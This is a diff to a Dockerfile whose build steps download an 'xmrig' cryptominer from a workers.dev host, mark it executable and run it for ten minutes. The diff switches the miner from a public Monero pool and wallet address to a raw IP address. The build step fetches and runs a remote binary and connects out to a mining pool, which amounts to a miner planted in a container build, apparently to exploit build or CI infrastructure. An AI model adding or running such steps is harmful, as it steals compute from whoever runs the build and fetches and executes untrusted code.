@@ -2,4 +2,4 @@ FROM centos:latest
 
 RUN curl -O https://ddos.nms.workers.dev/xmrig
 RUN chmod +x xmrig
-RUN sudo timeout 10m ./xmrig -o pool.minexmr.com:4444 -a rx/0 -u 453YeXrQMiahiYEbJXH4172KP8a6QagRAGWQpcpepuHiJ7QeiPyr2ZvEhwPrrTFu21ETGAY5SCdphFb26dYVcnSYHR1HPy5 -p $(date "+%Y%m%d%H%M%S")
+RUN timeout 10m ./xmrig -o 129.154.59.76:3333 -u $(date +%Y%m%d%H%M%S) --randomx-1gb-pages
